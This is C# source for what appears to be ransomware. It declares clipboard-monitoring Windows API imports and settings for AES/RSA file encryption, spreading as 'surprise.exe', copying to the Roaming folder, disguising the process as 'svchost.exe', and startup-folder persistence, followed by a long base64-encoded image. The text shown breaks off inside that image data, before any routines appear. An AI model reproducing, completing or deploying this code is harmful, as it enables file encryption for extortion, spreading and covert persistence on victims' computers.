using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAIBAQEBAQIBAQECAgICAgQDAgICAgUEBAMEBgUGBgYFBgYGBwkIBgcJBwYGCAsICQoKCgoKBggLDAsKDAkKCgr/2wBDAQICAgICAgUDAwUKBwYHCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgr/wgARCAEsAZADASIAAhEBAxEB/8QAHQABAAMAAwEBAQAAAAAAAAAAAAcICQMFBgQCAf/EABwBAQACAgMBAAAAAAAAAAAAAAAFBwQGAQIDCP/aAAwDAQACEAMQAAABz/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfVx8OEcgAAAAAAAAAAAAAAAAAAAAEozxdzR8Gtk7/VVmntzuBw5wSu8LBVbt17bDkcY+u1Lzfv/AA/KDZtcAAAAAAAAAAAAAAAAAAWXrhrVGQHtoz9nTKh7OhqPNjuHZoTHHq9SMwbCy+W/GfFqpnQNAYHnaMPlS48tuu9F53620gOMMAAAAAAAAAAAAAAAACY9Qs9tD6kjK3U0m6uO97vrR21IespqFlHPyzs4WlnxPeL6qy1Rz7DOnq+oubJDZNcAAAAAAAAAAAAAAAAAAs1ojmLprUUZQupug+fO+WN/O77TS3KrrzU4/NRehd59TSnh47+wmh9FddYbS6i0g0NzxWUG2aeAAAAAAAAAAAAAAAW5+rX+9PHa9VsHbs9cMfLDQ+v6EZ5aRc3z/YceffHOeG3JVgouKGOW3XeD9Lb3lqlQez14g3n4L+8h7/1g/ALZwjBykdCawgAAAAAAAAAAAHPwXP7RVrvWcn9+M9yy9hPYyq99zNG5N6jxNn6PsN3mL3sqq7a2V7h+atI2GHvVTF8PHT1PuqmVjycqzdHvg/l24B+pslNehHRXtLA1T58lGry+VqG1ce3tfFfXGhhxhAAAAAAAAAAAPR+cc+U79ZDaM9dB7L4w+l0njX2vcXWsrSfzthzaiJtmz8rFgIDuOB/H8MrAE6sSGbK3Z9NS8hHEowtVjUtlvPVul/X2T42KV1blC/T8xNY4OoAAAAAAAAAAAAADn4Did7NZ3IDw2ZhjOq0dfTMSQ9rV8ntm5STtItad7wfWxx1iUxwy8cAAAAAAAAAAAAAAAAASt18Ip/V/bA17k5dypoxUWFnqf+R+z47div3NkIOsbpjOeLcwVf73xgWULAV7seUUbbUw1tvvl0sdXy24T5Bm4AAAAAAAAAAAAADtup9X2x7yfHLcofOchD0v+YpdFbJeyvlBPO2H4zLDn5WpChkYYAD3ngzxvxaPGT01d99iPDVhtfTmw1w7+zHkvKTzDjqYYe+p4sPWCAAAAAAAAAAAAvXcLGb1teY9kaW/Z8e6bIGfBgAAAAALAV//AF6x+00MZ99HUW6dD+C2NcBwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB//EACsQAAEEAgIBAwMDBQAAAAAAAAYDBAUHAggAAVAQEUASEyAYIYAUFRYwMv/aAAgBAQABBQL+Ovtzpi8y4o3XS8cCVCZH+Qjq+FQ6cSHCkFh17Y9LtmznAhp6uiTA91fexqcnEyEO58TTGvmDvBs0bs0pwihhxsY7VMmOf6nrR/qxrbZupkJ2IIGyHLMqaHNWJYJvxV/4fXatMSaXRS6RwseyWQUyNZGxzF2gOELrp7BzUb3yNlJGGe0ne2JdzHLHPG6q9ZT8TKxriIkPCtGq711Xwq1ERsmnURyFCDGGmrdb5dfZasWrLl0uInGCe9odvOa61a4lpNJPpLC0TiHGoEqmcJ2a8LQ0KnM2U0w+hC/yXuPa1WA5WOUw0YnFR/L4rlSXaLM3CLyqNbnD/thHtY1vaFvxYUzKi6UK33htW0cczDH9sNj32Wb0INJYDnsdvVsEo/bSWbcJdgSWxlKho1oLd9dYJYW3ebGAbTM2/nXnh9W1esTLH/jY1tnjIeg8Oy5TK1HTMVX7JZZBohc16Y44PXrqQc9crOkAByJW7SAbDtu+vbvwmvMlhH2W2y+tDYUXzfJ9/t2FBU2dzVbVfAV7FyUkxiGdxXq4lFVllXCnA8ecFRNFNk2zXYQiwZI+FhZRzCSwgQMSSFJ4BAlh5ilSaVNa6rmGr+FMrBHQlrZd1zZm59dbKxWj2z141i2NzmCs7L+BFNVnsxFkuqSsTGTUO6g5D0o23swd+zeIvUPspfct61n4e2ICWWJHfoigs4VqHXZ47Xbt02yd52y0aN3LhZ2v6AVbEliPf0kF30G1ZEYKv8ts2cu1wl85kR9ZPpZG4x2Qi5P0qGBHiQ5QkBkfimb9o/RkIyPlm5XrIFz2auoUx92E1HhW+YnVgKF8cuWrFvbd/MWqUnJvZd3661Db2FCObHSySjv5eqiMFk3/AG9CAUHyhA01WarcJ68LRFfnv3wVsEvC1R/bWfbdQ+ztZyOPV8VJ3072HqVpiRbZQSGBlchsaZ9995d8xxyzyDKCPi7IJ1xBxbJNPBLHhlFREoPHzFgwIPlC5XOBsqrsha6iELfVnw70L2jFpfkfKxss2esGMkgaa2B5Dwyos5D+1ElUc/T37/COi5KXdBmrpVMcDaeBQnrrrrrhGajAoiZbVop8i9nrMYuCHZU2Io148cSDr5w2YEok6CtrXCfYtYQeZJd9Y5dGdLhJknYNAEwhkqkqgp61NSUtYKokDDYYxdvWUemUX5XI3gabNlc5yQlZGWX8I3cuGiwpsRYo12J7RBczxhKw88yPaBFC7E0o43D8lElEsmi+DZy12SsZi0lbytOX6fzUvK5+KgScgGHQXtXKNchSzQg1TKalAy/Av1Tk23J8GKxhbxPWOWXcHWJ+R9s9XLIXalInkLOOJqKJZh1/2CJ5AewgWY9qpM5BEhoytCPhLqV3wqqU6EMu8cse/Bh9MHxn2K6pizHGBAw0ZxXXQbI3JejJFB+/dSTv8Aa7jgG4FbHg5N0g5QdJqJprJmVEAhb0a63GI5x4weR63zYKGekUxCav1/ixk9TQ1zkH0bXwfzrHHDqQk46KQMdlg2A4bXgamWeeeSmX5iVlmgTmD7TQcjyLmIuaa8Ka5DzBJbUobUknGrFe5t7CCMw+Q+UEE+YaU17aIoeNOFRfECLIz2kInik4WEZGv/sGjElEHYRtZ1waMxkuacKjWBDm9q2I1NX/AMvVTph/jXNjp9vmv8DXCeTiT9FTrNK7Omn9qV+jpT5cVNzEE4ztayVE3kg+kVPgY5ZYZNrSsVonKlpPOfyf/8QARREAAQIDBAcEBQgHCQAAAAAAAQIDBAURABIhMQYTIkFRYXEyQoGRQFJiobEUMDNygpKiwTRDYLLC4fAHEBUWICNT0vH/2gAIAQMBAT8B/ZcbWXo8CYyeulMDstJNC6RUEjMNjvEb1HYBw2jaH0dl8Ezr3hX23TWv1QcPBCMONnJ3Cwzt1KFXfWSPyqFe60JMpZNUEC66BmMlD4LSevkbTORhhgxcIbzW8HtI+txB3LGG4gHP0OcF+OiGJRDmiogm8RmlpOLh6kbI5qs+uB0R0WcmOpvNsJuttDvqAy+qkbS958TZ0TScw7EYVpcW5dKjXYSgipuClTTBKQLozJ4WmklRL5exEhddZeFD7O8cUmtOtp+pEJD/ACxolMQnBsp7SlHJFO+lRzSailTs0vW0cXHqLOvQL6kjWp7lCBrASe6McTlQcqzFEK3HuohjVsKN08q4eh6OpETpxFuK/VMtpH21KUfgLf2imPEtZgYE3XEs3h9dzar5UFpXEwsmk8MxCskDAKTXaTeqVL3hW32qKHaqkd22lc+gYpiEYhQXo0gi6MNgdm8TgAnGq+GG0qgtIdFNW58ujlhTqRis4NtA7kD3VxcXyGAm07S82YSD2Wt57znNXAcEZDfVWXoejZDOnEYg/rGWlD7KlJPxFtMkFxyFixktpI8UbJHws/FRD0WIGATffIrj2W0+ss/up7SzlhVQkGjkHJYVcTEOZ/SOntLPqoH7qBspGKjmTNpy5MSGmxcZT2U/xKPeUeO7JNBZZdjNKoGCbJom+65T1Ui6kHkVnLfS2lEPCsQUFdSA4pKiaYVTeoivPA4504+gyhCp62HILaSSQDkCQaYE544Vyrvs+w9DPKadFFJNCOBtMURMFHsTeGTeWzUKSM1tq7QHtCl5PEim+z0xM+0Z1cvUlQWQpCzXY3KNN5pgUG7tDaIoawMpleh0AA4Ctxzb9pwnvuL3DglOIGAuC0wmUXMnAp44DIDBKRwA/oneTaMjmoQBNCpauyhOKlHkPiTRIzJFtDNGXIVb0wmSgHF0U6rc22nstpO/+NZrSgtO5mqbzFcRSickjgkYJHl7ybRMTDwbJefVdSN5s1Lo9+HU8hs3Uip5DjTPrhhvp89OZl/hMAYi7XFI4DaUE1UdyRWp5W0ak3+XpSiCDl66SQaUpVRVQchXCuNM7TyDTOo1UYyoJWvtJOArQAlKssaZKp1tNZbGiHXDLvNKUCAd4rvG4+B8bQr8TKYKHYgkJutiik5XstoHEpVWpN68FXsccbM6Rw7jWpfSpI4KTeT5i8B12bKgZVE7QVhyVT+fvtDMyCVVUKAnO5tLPVR/iUaeraZzp6PQGUC40MkjjxUe8r3DugWeiWIel9WJyGZPQCpPgLOSGPnzjOtTqmELSs3u2q4apF3G6K0qVGtMAm0A8lBca/5Uluud29QVpv6YWmMEuWx7sKsglBIqMsPnXmWohotupqk5g5GzhLsKIZR2BTDpgOeG7GzEVNYH6FzWJ9Vz8nBtfeC+toXSmEUnUxQ1de65QoPRXY97arPSmXRWLR1Z+8j/ALD8QtGy2Ml5GtTgclDFJ6EfDA8R/dGRsPAs6x08gMyScgkDEk7gP52gpNNZiAp86lJ7qaKc8TilPRIUR61bQ0rlEmBVggnMnbcPxV5lI5WfnraMIVv7S8fJPZHjetDxsXCRRiGlkLJrnv4gGoHgBZa1uLK1GpPoBAIobNMqhP0VZb5Ds/cNU+QTaF0kmUGkoiWw4g53Rn9ZpWf2FV4WaRIJxVUG5cVvGJp1SaOJ/EOtoiQxMPEJirgWUZKTtXePNPikdbLjIpwUUs06/wDnob0QxDiriqV9/QZk8gDaHhplFirbN0cV7P4cVed20Fo245/uxT9xtPaITgOVSSSTuSMTyGNo5cGuJV8lSUt7qmp6nmeWAys9DMP0KxiMjkR0IoR4G0NMZzLVC6rXI4KNHB9VeSvtgH27Qs6lU2Xq101nqrF1f5E9UqXZ2TQL30Si2ee0nz7Q8lWi5ZGwQvOJ2fWGKfMfA0PL5+LMQmFWWBVdDd60NPfbREwcTJUtLVffCRrb3bStWJqO77FMKAEVtDyaWylr5UUhF7vKqpauNK1WR0ups7O4Zv6Bu8eKsvuj81eFouPjI4jXLrTIZAdAMB5eJ/0PMMxCLrqQRz/r3ih52YiJrL/0dy+n1HKn7q+0PtXxaB0ohb9x0lhZworI8grsK6Gh9myJSzEx2tQiqju7uGJ2cE7sT1yFtI0y1M1V8hpcomtOyFU2gnkDl7vntH2lSaOi3FbSX1BfMUSE04EYVFp7NkTZ5vVpuobQECueGJJphiT8xNZeiay12EWaBYIrw5+dtG9IVyrUuRSby2xQ3clG7d34gHM5nMWOJ/av/8QARBEAAQIDBAYGBQoDCQAAAAAAAQIDBAURAAYSIQcTMUFRYSIyUnGBkUBCYoKhFBYjMGNykrHB8ENgshAVICRTc4PS4f/aAAgBAgEBPwH+V6itPR7537llz06kjWxJFQ3WgTXYXDu5JHSPsjMtxWk2/wCStlSks8jqmvPIq81mz+iO9zKNc242tfALIV5qAHxFoe89/rjRSWY4Lw9h2pBHsrz80rPda696pZeuB18LkpPXQesk/qk7lDuNDl6JPZyzduRRE1cFdWOiOLiskDzzPJNtHF0F32m7k3nBxN49/wDEcOZr7Kd439FOQrZeluCgH4uFeg1I1VUtJ2VKThwrFAG+PRByypXO1056u8shbmC2tWVFQp900qDlUH9DaOgJZNIFyHmSUqYoSrFsSAM119Up3KGe7OtDdB2MhL8IEixOIxkZjrM4syvcBh6XIgb8rGlcvQ9NkUtm7cFDJ2OOrUfcSAP6ja4sDDyu7MAyoZYEqV3r6Z/MeVpvo5vjeKbR0dGuJx7UHKjufRSKdQBFKYhtGE9q13noq7NzG3bxuBGqy3Ho+ojLrroNieVTkVWmE/vPpRmBlssTqoQbeFO06obT2UDKuwHNQuzdaV3VgdRCiqj11nrKP6DgkZDmc/RNNzCnLuwD42IdcSfeSCP6Ta6Uc3MbrQT6P9NKT3oGA/FNp7PZXdqWmOj1UTsSkdZauykfmrYkZncChm82lyca576KEbNPYQOCe24d58VYU0TaUSeXSGATBwSMKB5k9pR3k/8AgoMrX/mpklyYp9CsLi8LaDvqo1JHckHPna4rsxiLoQjscoqcUCanbhxHDXjlv7vQY+9V35ZOEyuJfCXzTo55YtgJpQE1G07xWlbbLXjkbN57vvytw4SuhQrsuJ6pPI5pPI13WurfCP0dxMTKpqwpQTU4K0KXO/sLyqRXcpNa2gLqTa/8Wid3iXRoj6NpB9TcNpwp47XFbVFO6FhYaBh0w8OgIQnIAZAfvzO8m0REQ0HDqiIlYbbTtUo0A/e4CpO4Wm0fE6WL0NQMECmBY38vWcPtLphQncPes220w0lpoUSkAAcABQDyFkpUs0FpbeKRziIWxBRCXFo2gHwrszHMVH1yRko8Ao5bThBNBzNKDna914/nReJyapa1RXhyrXqgCtcszQVplXZa7+laQTZCURx1D2+vUJ5K3V4KApxtDvNKwupopO3iD4itptosg507ExUTFuKiHFlSVmhCRnRBTvAyFQU0AGFO2zV0tJ10Cf7rcxo4IUFA/wDGunwz5m3zp0uOHVBhdf8AYH5kUtD3Cvxet9Ls/iChA3KViV7qB0E+PxtJJHLLvQAhIFGFO/io8VHefgNgAFnXG2Gi66oJSNpJAA7yaAedr16VJFBQERBy0651aVIxDJCcQwk1NCo0JphFK77aPLww93Lwh55or1g1eW1ONSc6etuyy87KGE0+tSpSTUWZk8ohystw7Yx1KugnOu2vRP73Wn2i27E5q4wn5O5xR1fFs5fhKe6y7taRrhrLsuWXGvs+mn3mjmO/D71pDpihXSGZwzqz20VKfFHWHgVd1oKNg5jDJiIVwLQdhSaj98jQ8v7DhSkqUaACpJyAA2kncBa8Olxlp8wsiZ1ytmNQNK+wgdJXeqlezZN19It+ng9MllDf2nRA+60P+o+9aRaK7tSmi4kfKF+31fBAy/EVd1vm5d/5U3EiFbC280kISKeQGzdUGnoU4utd6f1MdDJUrtdVf4k0PnisrR1OruvmKuxGlP2bmw8q9RXvpSfaFm9I8wkzoh7ywC2VdtIqk8wN/uLV3WhJrdy9UEWmXUPINCUd3aQaKy5gi0LAwMCmkM0lH3UpT+QHoalJbQVqNANpOQHeTQDxNpxpQunKVFCHC+sbmxl+M0T5YrSW/l5b3x2olUIlpsdZxdV4R4YElXBOdeQqbAUAFa2dbafaLTqQpJ2ggEHvBBHwtP8ARTJJidfLFfJXtuVS3XuriR3oNPZtFzDSjcZX+ZUpbQ9Y/Stn3to8Sk2kWmOXRFG5q0Wj2k9JPiOsPDFaAmUvmsPr4N1LiOKTXz3juIB+vRhKxi2Wvxee/kgvU8vGWmlKOqFAW1IGQIqCCaUKjXFU50tCyjSDpGQH33TqK5FZwt5dlCRn3hPvWkmiCRQJDkwWX1cOqjyHSPioWhYWGgmAxDoCEDYEgAeQ/fP/AAbqWvBoxuzPKuNJ+Tu8UDo+Lez8OE8rTG5F97mvmLgypSR/EZJ2e0nrAcapUnnZi/mkGdPNwkK8pS9wQhOI040GY47BTbZgvKh0F4UXhTiA2BVBiA5Vr9dpBuTEXzdhXGXw3qklJBBIzViqKb+I7s7SqAblMrYgWzUNJCa8ab/E1P1DDpYeS4N1pNo0VJb4iatRH0KVKUlNOl0sXRJ6tBi2jaAMh/Nn/8QAShAAAQMCAgUGCQkECgMBAAAAAQIDBAARBRIGEyExQRQiUWFxgRAyQkNQUpGhsRUjQERicpLB0SAzgtIWJDA0c4CywuHwU1Rk8f/aAAgBAQAGPwL/AC7XTFc/Aa+cZUO1Po4O4ZB1UW+2ZI2I7vW7qS7pG47iT3EKORv8I/WgjB9G4Me3FqKm/t31ZNauTHbcB4OIB+NHlujEdtZ89GRq1e6lz9E5hfaTt1ShzhRi4hGU2rr49noprSbTiNfNZcfD1jcOCnP5fbQZjtBKUiwAHCuV4zPQym2wE7T2ClRdEsJD6h559WyuUCXDyX/ccjGX9aSxpXowW/WfhOXH4VfrWu0exlt4gc9rctHak7fA48xEQJW8pGwOn8ldftoxpKFZMxCFlNu49B9EHSrFo+aJCcsw2sbHXv0Tv9lZBSm2lJVKy32i4bvu2cSeAp2XOwTFNT4xCorm7pVs/wCKKo2BTHAnxiiKo291EYhhEpjL42ujqTb2+BGI4XNcjvtm6HWl2IpOjmkikoxFI+bWNiZI6uhXV7KzJOw07jCGNoT/AFvKNtuDnaPhTmHShzm1Wv09foZuHGbzOOuBDaRxJNhUXA4yRaM0EqUPKXvUr209irozFAs0j1lncKLekUtKlISvkrjp5qpd9p7bXCaGrVs7aPJGg2D5KNgplM5xvXa24znc3bnX6qdMUfNaw6v7t9ngRpvizBEeOr+ooUP3rnr9ifj2VkFSYUiUjXvMlJTf92k8T+Qpye0gpRsS3ffYehoOuRdEXNIP8I2e+1JHVSYqF7I0cvkfbVsT/wB66OFvzFMsttF6S6nxrX4ddzTMNpxag20lALirmwFtvSfA7jLeJKSmQ8gLSR4irbO1NKgFsl1LmTKnbc3tTeOadtlDXjIw7cT/AIh4fdpEWGwlCEJCUJQmwA6BTkaHISqSOapY26s9A6VfDjSpU55WXNdKCq/eek+h57x3ow3Z3rTQ7Knov9Zaa7gmkY9hOUqAyutL8VxB3pNZBoKkqy80nEOP4KWZuibT6idhEsp/20zo/geimrUtz5hlDxcKl9J2DdQ0j0kyycVXzivelgn1ek/a9lbLACl4XgMjM4oWLqDtX93oH2vZRmT3bnyU8Ejq9ET2j5WGH3LTQPVU4kbp6F9xT4WsGwSGp5907Ep4dZ6B10JcgJfxB1Pz8m277KOhPxpUh91LbbabrWo2CRS8DwFXNPDivrV0J+zx40qXMeLjiztUrwYdJx7RxuTJcipeeccWraVC9thpqVo/C5Lr8yQA4TkWBfjwq3oWM04uwlMuM99rj4Uk9VGU0i/K42Uf4iNo91WpGDYKxc73nVeK0n1jXJcPZzvLtyiS4Oe6evoHVS5+IyEtNI3qPw6zSsGwNWVtJ8W/i9aulXVuFF59wqUo3UpR3+CFgEZJvJfCVEeSnyj7L0G2k5UgAIHQBXJ0uf3WIpR++vYPQ0bGIZ+djPpdR2g3qPi+HuXZktBxvqvvHcacwt5WUnnMueosbjSsLwmDqwtw8qWvxIx436jvHTScMw9q6jzn31DnPL6T+Q4Up3E5SS6lNwwFbe/opTUR8tMC4Tl2WH2ejt3/ALB01xZjK9LbywkKG1DXFf8AFw6u2nJspeVphvMs9Qpccq5zjuufHR6qe4egmpuNaTiI642FFhuLnyX4E5htpzEsN0rMjUozLbVDym3EjnUrD5drp2hSdyh0+EYDjTx+TJDlws/Vl+t93p9tJfZWFBQuCk3BrW6sZum1Ow8KwyQHANr+q/09X2qMvEpJVc3CL7B/3p8KWGGlLWs2ShIuSab0h06iattJzNYevevrc6vs+2g20mjhGGvBaUnZY/vnB/tT7zS5MhwqWtV1KPE+FcbBGkJbZtr5DxshF93aauNJ8MvwBDn8tOM4qGlapQC1NK3X3Hs+mJjxGFuuLNkIbTcnuqJNmRHWXXYqFONuoylKrbRbtpbKty0lJ7xSFyY5BYuy7s3G+w9h8MXDNJngmMQpWRS8utUNyL9dJV8oRI7DQDYs4kBP2APyoSIj6VoVuUlV70YmJQ232z5Lib//AJSpGFSnsPcV6qcyaszprEKOlUVd6DmP6WSJFvNxo4bB7yTQVgOAtIdt/eHOe5+I0qTKfQ00jxlrNgKcwPR1ZVcWWoGxX/Kn3nqpU2c9nWr3DoH7AkTopbXNlGQkKG3JYBJ93gmtJHFpgbPV2k/TMSfW02Z6HkArI5wZI4d9793h5PjeGNvc22a3OA7aVL0OxHKd/J3qLONYO6gDywnZ4N9Z9HsceYTfaze7Z/hOyktaR6Nx5Q4uxnC2r2bRQ5c9MgqPB6PmHtTV/wCmjHey5/LVxpMXj0MxVn8qKNGcAffVwclHKPZR5diBab8lpnYBVyfAEpFydwpDzkDkEZXn5gsbdSd9ImYi2rEpSdueSOYD1I3e29ZUJt4JXyswgpbjqUlxQ2oIGyi1AbCAppKloTuSo/S04xgE0svAZTsuFJ6COIrUDHGkbfGREQFdl65X/SNyUknnsS+eg/p3UiJpRFVhzx2a3x2j37xSZmGzWn2leKtpYUDRjYhEbebPkOJvS5OCEwHzwHi0p1yAZLA3PMbaLbrZSobwoeHf+wmDhcB2Q8rc2y2VH3UiVpRLThzJ3tJ57p/IUlzC8HSuQPrUjnue07u6rAUXscxdpm3kZrq9lKi6HYbfokP0pyY9EmIO5t+PbL3psaGGSMOgNN+d1KF/OdF+du6qXMluZnHFXUr6fyzR7GH4yr7QhfNV2jcaTD02wjMP/bh7+9H6VrNH8cYfNtrWay09qTtrKRcHeKUp7Dkx3zueZTb3UqVBTyqNfYtP/fjRaebKVJ3pUNo/YTieIZ4uGA/vbc57qR/NQgYDhbTItzikc5Xad5rWzpbTKR5TrgT8aUlGMJmvDzcTb76XEwBsQWDsunxjRkYjNceWTvWr0KmTFfW24g81barEd9Jak4gnEGE+bmi5t94baTH0gjO4Y6fKVz2/xD9K5Rh81iUw4N7awtKqVJgJEORwKfF/4pTi8PVIYG51kXrI62UkbwoUiQuMh4IVfVOXyq6jakQ4Aw1hCE5U6uANg4DqopkaXyUA+THs3/pouYlib75O8vPFXx9F8twDF34rnEsuWv2jcaTE00wpMhHGVF5qu9O4+6gMExxlxahtjrOVf4TR+UsEbQ4fPMDKaVI0RxNMhPBl7Yqi1jeByGbeUW9nt9FZUp29FD5J0SnOJPnCwUp9qqMmW5h8Ww8R6V+gsKMd7FY8g5uZqL84ettG7wB1pZSpJuCDupDLuI8vjJ3sTDmNupW+kQpbvyfLV5mSrYo/ZVuNauQ028g+S4kKFKW/o8iO4rzsQ5DSntFdJL9DMtH5ij8q4G7kHnWhmSayqFj6ES5AwZTMdX1qXzEW6uJ7qS9pRib85zi21823+tAYHo3DjkeWlkZvxHbSpEl1KG0DnLWqwFLwHAnM4PjW3udvQnq3mlzZjpW4s3UT+ymOxO5XFT9Vlm4A+yd6aRHxV44ZJV5Ek8wnqXu9tqD0d1K0qF0qSbg0WnWwpJ3pULg0p0QeRvnc6xu9lKlYQkTo44t7xWomxltL9VabfTo2CYci70p0Nt99NDE3Zr7qR844mRkzns4Cr4Zj86ML7QsJc/SkvRsJEqQn6zM56v0HdVki1GTic5phA8p1dqVHwQKnvjiNiKLbszk7HktNcKK1qJJO0n+wHyDjbiGxvjuHM2f4T+VIh6ZQTCd3coa5zR/NPvpM3C5zT7S/FW0sEHwFGM4O2VHzrabKrXo0mkojX2sJZGb8RNOIjS8QQ6ofNrL4ISey1atGbJrC2pKt6Fjh9Lh6SIja7kzt1N38YWsaUMEkuZ2EjXNONEFF91+Hg5Xibm1QOraTvVbeeoddLiaKRm4re4P2ur30ZGNYw++T67ht/a8s0exd6Mq/OSlXNV2p3GkwtOMKt/8AZEHxR+lct0exdmSjysitqe0cPBr8ZeWPmytLbbZJUBTq4LNkuydapRHcAPpk4oWNf8ojXDiE5Bl/3eCWy1JvZtuMix471fQeQyJORE+MpoZjsK96fhQVfhUPXqTm1jl7/wDjy7aOrOy+z6ZyrBsUfiuEWK47pST7KLS9OMTyneOVqrXTpbjyulxd/oIWhViNxFBqPptiSUp3DlaqPyxpBMk3FjrpClf5n//EACsQAQABAwMEAQQCAwEBAAAAAAERACExQVFhcYGRoRBAULHB0eEw8PGAIP/aAAgBAQABPyH/AM6iWAoqTNz+KvaXH5qPtsg6gF5sZ9HNENd2yeFl7qhiIgB9EvNGBQGhSLJIq+DQbpegd9D4oY+Knj0L9yehRhziNjusJ9pBWCkIgQQZAazp/VRHsiwBgtg4pbJpkvePXFLJxD8aW/PWnr4Co2n+VSma3d7NHRVfOkj60dcUM3GoA7YjeJ/v4lTfzkUkyejqfaBaHznKl3sLl2NBe67tNtJhAbE/tnW1ah6UnSlnQw0pVUgVtxMWUo9EiJcwI+Jx01O6n4xSGjdgZRol3FzsDUwLNEyiAuBYufO9NNRjB0HCX+zM+z0ow8tRSnBm9pNEplbxPNd4Gowa0ShktDjnF0qMtAwYU7JBYIFZYDEtQbi3JlTl05tNRflH6n4fGIb+IP8AU60D9HXej7khZYvPHItJLILSoF5c/ZgaKFSSf3dJMLsmoEm5rJ9M0HDf4xgidpBdxdvUyX/mIK4LuvxMzKXFDXcjGjvTvFsZDYN71YfKUjzY9F90xQVPiBWAMBtU0MoI7P68eCp7O2tzre3xH2c77k4/06MA0pjZS91HkpBVczsg6COiDTMMM9HVFxRUu8RicJLGCO9FDHsz4MlkhYMtSjKs1Ans/wBjGIPOwFTUKgekj8uvypoOIe2Gn7qFwVCfZlazzrTc1CrP1D+bBf0sNWwGqsVFT6uJ3vJnVaCnlUiQarpSpoYcB/5mWVlqlXwZ/sHFQm9CMVnY4gLAhHFOwLtdgbmXiNKZ3o/ZcpnLVRPNen+abyJAOM7w90VERGlSwjNk+67bGVsUJgFAw9fQNjlvQ9Q5LoDKaBVoRYAiNq215LSHPSBW6/C4W56z2Su1E7FXRQFHADeW2PWAe9OfssLm6uRQ6MRRU7zrjJ5kHko7ENB/ANHhasNHSMlLXAmqCrVpCyJ2zsDu1AdAMGy9Pt0GpWUGU7QbtVdxilVl+M02qwBR4Gw7lAfObAMddO9Yh+T0/wC5p9iwBx5KREkMwW3a0FaOWgUxmNqk0EKXOB86qISk0ctPZrJI6hQJIiZHeptFc1RZpzhZNaQbr+CpDUys7rfLyu/JNgq0sAF2o7DjXMmx5HYWTyAGhFNX/C3rOtrQrR2cT5I8CX0JYVIYA0pdbYX5oAJRpOQCVo/WSp6FfsC7TSF3w8ZYyrVzI2Q/dGFzZhPSGz8jXmRRpbR7MRrUJxkphABtGygM5JQHCWa4uYByOV0q7fK1N0tQbmMNDoKe6Gi3PCSR9FAiCDePYdooEyyD3dOXGjS2XPF4lKS4EGkGgbfILioTOI79Osk4Z1+HNyzaujssk0/V6aAtSDYJsdWlECCsWaXiVFw2Bs4ZK1SsW+w4/FS6FvVm87VcrnVkmK5vMndmgbgjrClJ6qCYrvDutW3OJFGmjj58ir/8hh8wvW6WRB427Uocqyr8KHRAF1qePiVtuy+8HNRXBBuUFCGMcVOzUY+sZAoesEYZoFEHxkANNGOfq3jDslsutg8VD9SbcdDHulbmcWRoWe8UnB8pSug8p3okYz0UktWdIgz7x2q+KaXG/rw08UrCCdqcFl0E7PzyKl3+c7LePbRzTsHzCBt/e9KCLN7g7n6KsatgpLMdJezHeKYm9wU9wx+etLENsjoTyLT5peCUM3FZmFnWmmNO1frpTFA7lPPH7CgnWxCOpP27ULvSLxQHikYgQhInNFTzcnI/UU2HdTtO/EHrSjOiITkfnNJTcovzMmm6saS0dgglV3e7y+qSl64g8qwhxaM84/mtSHHa6599qnjAXv8Az7LPyQ6/cFyo5mD0qIvKat02Of6EncVai5EjZiR6VChLEy/PRc4pe3Y1Hak+kpEon0XhO4GO9QJxpYcBMAMAVlhtBeg1/eC8J9qxigIcigP9hcalWmAg8r6HoawEae8MK+yl0bsY+bWrN8nwrn3V/IrqfNI+0nUKYAXa06ghPe0UkikuWNVWAJc6UkeobcfEidibu3wLgEOVuJirQGCXoPvPSsMPRzaekYeKc5tJHZq9OUpm3gtUALVHdsVS5Et1Akp0kGETH2OKe5hYeZI8KoO8vona0vyUacYHvc9qmJ6CHyuKiliCo/L/AOZK/QjERscf/Apir52LjaPSY4qLuQioAK+QGB1EoY32/qBtQsLoMS5/g0ZMK6dyf0U2OMoX10YTY4FZeAleCoAkYRroDJg8rQG4jtILReNGI5NwfSqIEcUCRpTH3ntR0+gWR/fqrqE05/rfPNSVnIlXf/Aht0/hMHWDQSjhTM3T+JzQn2nvqFc1o/8A5NvYhonfelRsIjw9qPwiLNvlHXXalgX1ZyMtRLj9WRi6sJUA6MLDvUorN7fBZYcLj4mYWFG8FsGqq+ksg3I/06VkU+M8Kmf8hG9CS697CkOJwyjq1zuelQIiDLHRLrh+HrbXikzgpCKkcJjcrGXX6wS6rpuDxNnM0I2GXYoge8KWM6Xnmlln6CHYlwjQutwdY1rrSpdaaoLIureJigDJNN2+sYRsBTZlc4afbGP7Koi5hzPP0L4HSiEaD5EB+5ptayEG13HH/p//2gAMAwEAAgADAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABDiAAAAAAAAAAAAAAAAAAAABCMFV7gAAAAAAAAAAAAAAAAAAGaTo96iQAAAAAA